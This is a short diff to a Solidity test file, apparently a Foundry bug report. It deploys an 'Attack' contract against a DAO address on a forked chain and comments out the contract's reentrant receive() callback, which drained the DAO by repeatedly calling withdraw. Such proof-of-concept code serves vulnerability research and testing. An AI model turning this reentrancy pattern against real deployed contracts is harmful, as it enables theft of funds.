@@ -19,12 +19,12 @@ contract Attack {
         dao.withdraw(msg.value);
     }
 
-    receive() external payable {
-        uint256 bal = address(dao).balance;
-        if (bal >= msg.value) {
-            dao.withdraw(msg.value);
-        }
-    }
+    // receive() external payable {
+    //     // uint256 bal = address(dao).balance;
+    //     // if (bal >= msg.value) {
+    //     //     dao.withdraw(msg.value);
+    //     // }
+    // }
 }
 
 contract BugReport is Test {
@@ -33,7 +33,7 @@ contract BugReport is Test {
     function bug(uint256 forkId, address addr) internal {
         vm.selectFork(forkId);
 
-        // att = new Attack{ value: 1 ether }(addr);
-        // att.attack{ value: 1 ether }();
+        att = new Attack{ value: 1 ether }(addr);
+        att.attack{ value: 1 ether }();
     }
 }
